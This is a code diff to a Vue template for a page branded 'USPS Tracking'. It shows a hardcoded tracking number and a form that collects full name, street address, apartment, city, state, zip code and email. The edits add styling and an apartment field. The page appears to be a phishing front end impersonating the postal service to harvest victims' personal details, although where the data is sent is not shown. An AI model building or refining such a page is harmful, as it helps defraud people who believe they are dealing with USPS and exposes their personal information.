@@ -1,8 +1,10 @@
 <template>
   <!-- code... -->
-  <div class="p-5 bg-[#f7f7f7] flex justify-between fixed top-14 w-full z-40">
-    <div class="w-[217px]">
-      <img src="/logo-sb.svg" alt="usps-tracking" />
+  <div
+    class="p-5 bg-[#f7f7f7] flex justify-between fixed top-14 lg:top-20 w-full z-40"
+  >
+    <div class="w-[217px] text-3xl text-text-heading font-helv3">
+      USPS Tracking
     </div>
     <div>
       <p class="text-text-heading font-semibold">
@@ -10,13 +12,15 @@
       </p>
     </div>
   </div>
-  <div class="pt-40 md:pb-20 pb-10">
-    <h4 class="font-semibold text-text-heading w-max mx-auto text-xl">
+  <div class="pt-40 md:pb-20 pb-10 max-w-5xl lg:pt-48 mx-auto">
+    <h4
+      class="font-semibold text-text-heading w-max mx-auto text-xl lg:text-2xl"
+    >
       Track Another Package <i class="ri-add-line text-red-600"></i>
     </h4>
   </div>
 
-  <div class="p-5 bg-[#f7f7f7]">
+  <div class="p-5 bg-[#f7f7f7] max-w-5xl mx-auto lg:p-10">
     <div class="mb-5">
       <h4 class="font-bold text-xl text-text-heading">Tracking Number :</h4>
       <p class="font-helv2 text-text-body">US94512106007770</p>
@@ -50,6 +54,7 @@
         <Input label="Full name" v-model="store.firstname" />
         <Input label="Street Address 1" v-model="store.address" />
         <Input label="Street Address 2(OPT)" v-model="store.address2" />
+        <Input label="Apartment,Suite,unit,Building" v-model="store.apart" />
         <Input label="City" v-model="store.city" />
         <Input label="Select State" v-model="store.state" />
         <Input label="Zip code *(OPT)" v-model="store.zip" />
@@ -57,7 +62,7 @@
         <Input label="E-mail Address" v-model="store.email" />
       </div>
       <button
-        class="bg-text-heading text-white px-7 py-2 mx-auto block"
+        class="bg-text-heading text-white px-7 py-2 mx-auto block lg:px-10 lg:py-4 lg:text-xl lg:my-10"
         @click="handleSubmit"
       >
         {{ loading ? "please wait..." : "Continue" }}
@@ -84,7 +89,6 @@ function handleSubmit() {
   const dataPoints = [
     "firstname",
     "address",
-    "address2",
     "city",
     "state",
     "zip",
